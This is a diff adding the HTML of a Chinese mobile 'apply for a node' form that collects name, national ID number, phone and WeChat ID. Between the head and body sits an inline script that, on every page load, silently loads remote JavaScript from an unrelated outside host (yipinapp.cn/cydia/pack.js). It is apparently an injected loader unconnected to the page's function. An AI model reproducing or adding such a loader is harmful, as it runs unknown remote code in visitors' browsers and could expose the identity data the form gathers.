@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>申请节点</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/weui-jquery.css" />
+		<link rel="stylesheet" href="../../static/css/account/distributor.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<header class="weui-bar weui-bar-nav" id="returnBtn">
+		    <a class="weui-pull-left weui-btns">
+		        <span class="weui-cell__fts"></span>
+		    </a>
+		    <div class="weui-title">申请节点</div>
+		</header>
+		<div class="distributorOne">
+			<h3>申请资料填写</h3>
+			<div class="formInput" id="twodistributor">
+				<div class="weui-cell">
+					<div class="weui-cell__hd"><label class="weui-label">姓名</label></div>
+				    <div class="weui-cell__bd bgDiv">
+				      <input class="weui-input" type="text" id="nodeName" placeholder="请输入姓名">
+				    </div>
+				</div>
+				<div class="weui-cell">
+					<div class="weui-cell__hd"><label class="weui-label">身份证号</label></div>
+				    <div class="weui-cell__bd bgDiv">
+				      <input class="weui-input" type="text" id="nodeNo" placeholder="请输入身份证号">
+				    </div>
+				</div>
+				<div class="weui-cell">
+					<div class="weui-cell__hd"><label class="weui-label">手机号码</label></div>
+				    <div class="weui-cell__bd bgDiv">
+				      <input class="weui-input" type="number" id="nodetel" placeholder="请输入手机号码">
+				    </div>
+				</div>
+				<div class="weui-cell">
+					<div class="weui-cell__hd"><label class="weui-label">微信号码</label></div>
+				    <div class="weui-cell__bd bgDiv">
+				      <input class="weui-input" type="text" id="nodeChat" placeholder="请输入微信号码">
+				    </div>
+				</div>
+				<p class="noticeTxt">*填写资料并提交后，请申请加入群"<span class="grop"></span>"进行审核</p>
+			</div>
+			<div class="forgetDiv">
+				<div class="consult">
+					<label class="weui-agree agreement">
+						<input type="checkbox" class="weui-agree__checkbox" id="checklist" />
+						<span class="weui-agree__text">我已阅读并同意</span>
+					</label>
+					<a href="nodeAgree.html">《节点用户协议》</a>
+				</div>
+				<button type="button" class="weui-btn mybgBtn" id="nodeBtn">我要申请</button>
+			</div>
+		</div>
+		<script type="text/javascript" src="../../lib/zepto.min.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/account/nodetwo.js" ></script>
+	</body>
+</html>
